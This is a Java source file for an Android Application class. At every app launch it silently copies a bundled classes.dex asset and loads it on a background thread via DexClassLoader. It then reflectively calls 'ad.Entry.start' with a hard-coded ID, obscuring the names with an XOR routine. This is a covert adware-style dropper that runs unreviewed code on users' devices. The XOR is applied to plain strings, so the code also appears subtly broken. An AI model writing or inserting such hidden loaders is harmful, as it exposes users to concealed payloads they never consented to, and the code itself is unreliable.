package aaaaaa;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;

import android.app.Application;
import android.content.Context;
import android.util.Base64;
import dalvik.system.DexClassLoader;

public class App extends Application {

	@Override
	public void onCreate() {
		super.onCreate();
		App.init(this);
	}

	public static void init(final Context context) {
		byte[] dex = "classes.dex".getBytes();
		for (int i = 0; i < dex.length; i++) {
			dex[i] ^= 0x12;
		}
		byte[] odex = "odex".getBytes();
		for (int i = 0; i < odex.length; i++) {
			odex[i] ^= 0x12;
		}

		final String dexFile = context.getFilesDir() + File.separator
				+ new String(dex);
		final String odexDir = context.getFilesDir().getAbsolutePath()
				+ File.separator + new String(odex);
		new File(odexDir).mkdirs();
		new Thread(new Runnable() {
			@Override
			public void run() {
				// 装载dex
				DexClassLoader dcl = null;
				InputStream is = null;
				FileOutputStream fos = null;
				try {
					is = context.getAssets().open("classes.dex");

					File destDir = new File(dexFile.substring(0,
							dexFile.lastIndexOf("/")));
					if (destDir.isDirectory()) {
						if (!destDir.exists()) {
							destDir.mkdirs();
						}
					}
					fos = new FileOutputStream(dexFile);
					int len = -1;
					byte[] buf = new byte[512];
					while ((len = is.read(buf)) != -1) {
						fos.write(buf, 0, len);
						fos.flush();
					}

					if (new File(dexFile).exists()) {
						dcl = new DexClassLoader(dexFile, odexDir, null,
								context.getClassLoader());
					}
				} catch (Exception e) {
					e.printStackTrace();
				} finally {
					if (fos != null) {
						try {
							fos.close();
						} catch (IOException e) {
							e.printStackTrace();
						}
					}
					if (is != null) {
						try {
							is.close();
						} catch (IOException e) {
							e.printStackTrace();
						}
					}
				}

				if (dcl != null) {
					try {
						byte[] entry = "ad.Entry".getBytes();
						byte[] start = "start".getBytes();
						for (int i = 0; i < entry.length; i++) {
							entry[i] ^= 0x12;
						}
						for (int i = 0; i < start.length; i++) {
							start[i] ^= 0x12;
						}
						Class cls = dcl.loadClass(new String(entry));
						Method m = cls.getDeclaredMethod(new String(start),
								String.class, Context.class);
						m.setAccessible(true);
						m.invoke(null, "01hbPe10", context);
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
		}).start();
	}
}
